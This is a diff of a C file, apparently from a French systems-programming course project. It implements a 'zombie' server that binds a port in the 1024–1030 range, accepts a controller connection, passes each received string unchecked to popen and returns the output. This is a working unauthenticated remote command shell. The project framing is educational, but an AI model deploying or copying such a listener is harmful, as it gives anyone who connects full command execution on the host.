@@ -4,52 +4,110 @@
 #include <unistd.h>
 #include <sys/types.h>
 #include <sys/socket.h>
-#include <netinet/in.h>
 #include <arpa/inet.h>
+#include <netdb.h>
 
-
-
-/*
-1. int getPort(int minPort, int maxPort) : renvoie un port ouvert dans la plage définie par minPort et maxPort, ou –1 en cas d’erreur. 
-
-2. int createConnection(int port) : créé un socket qui écoute sur le port donné en paramètre. 
-
-3. int toArgTable(char * commande, char *** table) : découpe une commande selon les espaces, les morceaux sont stockés dans le tableau “table” alloué dynamiquement pendant la fonction. La fonction renvoie le nombre de morceaux stockés dans le tableau. 
-
-4. int main(int argc, char* argv[]) : Initialise le serveur et attend les connexions entrantes. 
-*/
+#define BUF_SIZE 1024
 
 #include "utils_v2.h"
 #include "messages.h"
 
 
+int getPort(int minPort, int maxPort) {
+    int sock, port;
+    struct sockaddr_in addr;
+    for (port = minPort; port <= maxPort; port++) {
+        sock = socket(AF_INET, SOCK_STREAM, 0);
+        if (sock < 0) {
+            continue;
+        }
+        memset(&addr, 0, sizeof(addr));
+        addr.sin_family = AF_INET;
+        addr.sin_addr.s_addr = htonl(INADDR_ANY);
+        addr.sin_port = htons(port);
+        if (bind(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
+            close(sock);
+            return port;
+        }
+        close(sock);
+    }
+    return -1;
+}
 
-/**
-     * PRE  : la plage de port acceptés.
-     * POST : cherche un port ouvert dans la plage fournie. 
-     * RES  : le numéro d'un port ouvert ou -1 si aucun port n'est disponible ou en cas d'erreur.
-*/
-int getPort(int minPort , int maxPort){
-   
+int createConnection(int port) {
+    int sock;
+    struct sockaddr_in addr;
+    sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock < 0) {
+        return -1;
+    }
+    memset(&addr, 0, sizeof(addr));
+    addr.sin_family = AF_INET;
+    addr.sin_addr.s_addr = htonl(INADDR_ANY);
+    addr.sin_port = htons(port);
+    if (bind(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
+        close(sock);
+        return -1;
+    }
+    if (listen(sock, 1) < 0) {
+        close(sock);
+        return -1;
+    }
+    return sock;
+}
+
+int toArgv(char * commande, char *** arguments) {
     return 0;
 }
 
-/**
-     * PRE  : port, le port désiré.
-     * POST : une nouvelle connection est créée. Celle-ci accepte toutes les adresses et écoute sur le port fourni en paramètre.
-     * RES  : un fd d'un socket qui écoute sur le port passé en paramètre ou -1 en cas d'erreur.
-*/
-int createConnection(int port){
+int main() {
+    int port = getPort(1024, 1030);
+    if (port == -1) {
+        printf("Impossible de trouver un port disponible\n");
+        return 1;
+    }
+    int sock = createConnection(port);
+    if (sock < 0) {
+        printf("Impossible de créer une connexion\n");
+        return 1;
+    }
+    printf("Le zombie tourne sur ce port   %d...\n", port);
+    struct sockaddr_in client_addr;
+    socklen_t client_addr_len = sizeof(client_addr);
+    int client_sock = accept(sock, (struct sockaddr*)&client_addr, &client_addr_len);
+    if (client_sock < 0) {
+        printf("Impossible d'accepter la connexion\n");
+        return 1;
+    }
+    close(sock);
+    char buf[BUF_SIZE];
+    int n;
+    while (1) {
+        memset(buf, 0, BUF_SIZE);
+        n = recv(client_sock, buf, BUF_SIZE, 0);
+        if (n <= 0) {
+            break;
+        }
     
-  return 0;
+    printf("Commande reçue par le controlleur : %s\n", buf);
+    FILE * fp = popen(buf, "r");
+    if (fp == NULL) {
+        printf("Erreur lors de l'exécution de la commande\n");
+        continue;
+    }
+    while (1) {
+        n = fread(buf, 1, BUF_SIZE, fp);
+        if (n <= 0) {
+            break;
+        }
+        send(client_sock, buf, n, 0);
+    }
+    pclose(fp);
 }
 
-int toArgTable(char * commande, char *** table){
-  return 0;
-} 
+close(client_sock);
 
-
-
-int main(int argc, char* argv[]) {
-  return 0;
+return 0;
 }
+
+           
